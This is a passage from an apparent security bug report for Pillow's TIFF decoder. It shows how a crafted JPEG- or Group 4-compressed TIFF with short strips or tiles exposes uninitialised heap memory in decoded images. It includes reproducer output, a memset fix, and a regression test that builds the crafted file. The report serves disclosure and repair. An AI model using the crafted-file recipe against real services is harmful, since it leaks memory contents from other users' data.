buffer that `_decodeStrip()`/`_decodeTile()` is about to `realloc()`. For rows 8–255 it then counts copies of `LEAK` and bytes equal to `0x55` (glibc's fresh-`malloc` fill under `MALLOC_PERTURB_=170`). The files contain no `LEAK` bytes (the script asserts this), so any copy in the image came from freed heap memory. It reports `BUG` if a crafted file shows any `LEAK` in the normal pass, or rows 8–255 entirely `0x55` in the perturbed pass. **Expected output on this tree:** ``` [normal ] strip well-formed (1222 B) rows 8-255: 0 x b'LEAK', 0/63488 == 0x55, head=b'\xc8\xc8\xc8\xc8\xc8\xc8\xc8\xc8' [normal ] strip crafted ( 478 B) rows 8-255: 15872 x b'LEAK', 0/63488 == 0x55, head=b'LEAKLEAK' [normal ] tiled well-formed (1234 B) rows 8-255: 0 x b'LEAK', 0/63488 == 0x55, head=b'\xc8\xc8\xc8\xc8\xc8\xc8\xc8\xc8' [normal ] tiled crafted ( 490 B) rows 8-255: 15872 x b'LEAK', 0/63488 == 0x55, head=b'LEAKLEAK' [perturb] strip well-formed (1222 B) rows 8-255: 0 x b'LEAK', 0/63488 == 0x55, head=b'\xc8\xc8\xc8\xc8\xc8\xc8\xc8\xc8' [perturb] strip crafted ( 478 B) rows 8-255: 0 x b'LEAK', 63488/63488 == 0x55, head=b'UUUUUUUU' [perturb] tiled well-formed (1234 B) rows 8-255: 0 x b'LEAK', 0/63488 == 0x55, head=b'\xc8\xc8\xc8\xc8\xc8\xc8\xc8\xc8' [perturb] tiled crafted ( 490 B) rows 8-255: 0 x b'LEAK', 63488/63488 == 0x55, head=b'UUUUUUUU' BUG ``` `im.load()` succeeds for every file. For the crafted files rows 8–255 are the uninitialised strip/tile buffer, copied as-is into the image. With the attached patch applied, rows 8–255 of the crafted files come back as `\x00` bytes, with no `LEAK` and no `0x55`, and the script ends with `OK`. The `LEAK` count depends on where glibc places the buffer (the same freed chunk was reused in 500 of 500 runs here); the `MALLOC_PERTURB_` pass does not. The script covers the JPEG codec only. The Group 4 variant in the Details section (`Compression=4`, a T.6 stream that ends early) goes through the same `_decodeStrip()` copy, and the same fix covers it. ## Suggested fix The attached patch zeroes `state->buffer` before each libtiff read in both loops of `src/libImaging/TiffDecode.c` — before `TIFFReadTile()` in `_decodeTile()` and before `TIFFReadEncodedStrip()` in `_decodeStrip()` — so rows a codec does not produce are deterministic zeros rather than stale heap: ```diff --- a/src/libImaging/TiffDecode.c +++ b/src/libImaging/TiffDecode.c @@ _decodeTile for (x = state->xoff; x < state->xsize; x += tile_width) { + memset(state->buffer, 0, state->bytes); if (TIFFReadTile(tiff, (tdata_t)state->buffer, x, y, 0, plane) == -1) { @@ _decodeStrip for (plane = 0; plane < planes; plane++) { ImagingShuffler shuffler = unpackers[plane]; + memset(state->buffer, 0, state->bytes); if (TIFFReadEncodedStrip( ``` A `memset` per strip/tile (rather than one `calloc` after the size is known) is needed because the same buffer is reused for every strip, and a short last strip would otherwise expose the previous strip's rows — harmless for disclosure, but the per-read `memset` keeps the behaviour uniform at the cost of one extra pass over the buffer. Promoting libtiff warnings to errors via a warning handler is not a good alternative: both codecs only warn (`Improper JPEG strip/tile size`, `Premature EOL`), but so do many legitimate files (unknown tags, bad tag counts), and the return value of `TIFFReadEncodedStrip()` carries no row count to check against. Initialising the buffer covers every codec. `_decodeAsRGBA()` needs no change: `TIFFRGBAImageGet()` fills its whole raster, and JPEG files do not reach it (`JPEGCOLORMODE_RGB` sends them down the strip path). Valid files decode exactly as before; rows a codec does not produce are now black instead of garbage, and nothing that previously loaded now fails. The patch also adds `test_jpeg_short_strip` to `Tests/test_file_libtiff.py`, parametrised over strip and tile, which builds the 256×8-JPEG-in-256×256 file and asserts rows 8–255 are zero. It is a regression guard for the fixed code rather than a reliable detector of the bug: in a fresh pytest process the unfixed strip variant can pass because the new heap chunk happens to be zero (the tiled variant fails before the fix). With the patch, `Tests/test_file_libtiff.py` and `Tests/test_file_tiff.py` pass and the reproducer prints `OK`. ## The patch Zero the libtiff strip/tile buffer before each TIFFReadEncodedStrip/TIFFReadTile in TiffDecode.c so short strips do not expose uninitialised heap Applies to `src/libImaging/TiffDecode.c` at the commit above. ```diff diff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py index 3d804ea4a..67bc96329 100644 --- a/Tests/test_file_libtiff.py +++ b/Tests/test_file_libtiff.py @@ -1162,6 +1162,45 @@ class TestFileLibTiff(LibTiffTestCase): im.load() assert im.size == (950, 975) + @pytest.mark.parametrize("tiled", (False, True)) + def test_jpeg_short_strip(self, tiled: bool) -> None: + # The JPEG data in the strip/tile only contains 8 of the 256 rows that + # RowsPerStrip/TileLength declare. libtiff decodes the rows that exist + # and still reports success, so the remaining rows must be cleared + # rather than left as uninitialised memory. + jpeg = io.BytesIO() + Image.new("L", (256, 8), 200).save(jpeg, "JPEG") + jpeg_data = jpeg.getvalue() + + ifd = TiffImagePlugin.ImageFileDirectory_v2() + ifd[256] = 256 # ImageWidth + ifd[257] = 256 # ImageLength + ifd[258] = 8 # BitsPerSample + ifd[259] = 7 # Compression: JPEG + ifd[262] = 1 # PhotometricInterpretation: BlackIsZero + ifd[277] = 1 # SamplesPerPixel + if tiled: + ifd[322] = 256 # TileWidth + ifd[323] = 256 # TileLength + ifd[324] = 0 # TileOffsets + ifd[325] = len(jpeg_data) # TileByteCounts + # Point the tile data at the end of the IFD + ifd[324] = 8 + len(ifd.tobytes(8)) + else: + ifd[278] = 256 # RowsPerStrip + ifd[STRIPOFFSETS] = 0 # Updated by tobytes() to follow the IFD + ifd[279] = len(jpeg_data) # StripByteCounts + + b = io.BytesIO() + ifd.save(b) + b.write(jpeg_data) + + with Image.open(b) as im: + assert im.tile[0][0] == "libtiff" + im.load() + assert im.crop((0, 0, 256, 8)).getextrema() == (200, 200) + assert im.crop((0, 8, 256, 256)).getextrema() == (0, 0) + def test_orientation(self) -> None: with Image.open("Tests/images/g4_orientation_1.tif") as base_im: for i in range(2, 9): diff --git a/src/libImaging/TiffDecode.c b/src/libImaging/TiffDecode.c index 8a57c523d..d1d6bfbbb 100644 --- a/src/libImaging/TiffDecode.c +++ b/src/libImaging/TiffDecode.c @@ -457,6 +457,11 @@ _decodeTile( for (plane = 0; plane < planes; plane++) { ImagingShuffler shuffler = unpackers[plane]; for (x = state->xoff; x < state->xsize; x += tile_width) { + // Some codecs (e.g. JPEG, Group 4) succeed on a tile that decodes + // to fewer rows than the tile length, leaving the rest of the + // buffer untouched.
